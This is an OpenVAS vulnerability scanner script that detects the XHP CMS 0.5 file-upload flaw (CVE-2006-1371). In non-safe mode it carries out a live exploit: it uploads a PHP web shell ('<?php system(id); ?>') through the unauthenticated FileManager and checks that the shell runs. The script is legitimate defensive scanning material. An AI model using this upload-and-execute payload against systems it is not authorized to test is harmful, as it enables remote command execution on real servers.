# OpenVAS Vulnerability Test
# $Id: xhp_cms_file_upload.nasl 14240 2019-03-17 15:50:45Z cfischer $
# Description: XHP CMS Version <= 0.5 File Upload Vulnerability
#
# Authors:
# Ferdy Riphagen
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Original advisory by : rgod
# http://retrogod.altervista.org/XHP_CMS_05_xpl.html

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200100");
  script_version("$Revision: 14240 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-17 16:50:45 +0100 (Sun, 17 Mar 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_cve_id("CVE-2006-1371");
  script_bugtraq_id(17209);
  script_name("XHP CMS Version <= 0.5 File Upload Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to version 0.51 or a newer release.");

  script_tag(name:"summary", value:"The installed XHP CMS application does not authenticate users to access
  the FileManager scripts located at:

  '/inc/htmlarea/plugins/FileManager/manager.php'

  and

  '/inc/htmlarea/plugins/FileManager/standalonemanager.php'");

  script_tag(name:"impact", value:"This allows an attacker to upload content to the webserver, and
  execute arbitrary commands with privileges of the webserver account.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/17209");
  script_xref(name:"URL", value:"http://xhp.targetit.ro/index.php?page=3&box_id=34&action=show_single_entry&post_id=10");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

host = http_host_name(port:port);

foreach dir( make_list_unique( "/test/xhp", "/xhp", "/xhpcms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  req = http_get(item:string(dir, "/inc/htmlarea/plugins/FileManager/standalonemanager.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if ("XHP File Manager" >!< res)
    continue;

  if (!safe_checks()) {
    rand = rand();
    file = string("DELETE_FILE_", rand, ".php");
    content = "<?php system(id); ?>";

    exp = string("--", rand, "\r\n",
                 'Content-Disposition: form-data; name="dir"', "\r\n\r\n",
                 "/\r\n",
                 "--", rand, "\r\n",
                 'Content-Disposition: form-data; name="upload"; filename="', file, '"', "\r\n",
                 "Content-Type: text/plain\r\n\r\n",
                 content, "\r\n",
                 "--", rand, "\r\n",
                 'Content-Disposition: form-data; name="submit"', "\r\n\r\n",
                 "Upload\r\n",
                 "--", rand, "--\r\n");

    req = string("POST ", dir, "/inc/htmlarea/plugins/FileManager/images.php HTTP/1.1\r\n",
                 "Content-Type: multipart/form-data; boundary=", rand, "\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Length: ", strlen(exp), "\r\n",
                 "Connection: close\r\n\r\n",
                 exp);
    recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);

    req2 = http_get(item:string(dir, "/filemanager/", file), port:port);
    recv2 = http_keepalive_send_recv(data:req2, port:port, bodyonly:TRUE);
    if (!recv2)
      exit(0);

    if(egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:recv2)) {
      report = string("## It was possible to upload and execute a file on the remote webserver.\n",
                      "## The file is placed in directory: ", '"', dir, "/filemanager/", '"', "\n",
                      "## and is named: ", '"', file, '"', "\n\n",
                      "## You should delete this file as soon as possible !!!\n");
     security_message(port:port, data:report);
     exit(0);
   }
  } else {
    req = http_get_cache(item:string(dir, "/index.php"), port:port);
    if (egrep(pattern:"<a href[^>]+>Powered by XHP CMS v0\.(4\.1|5)", string:req)) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit( 99 );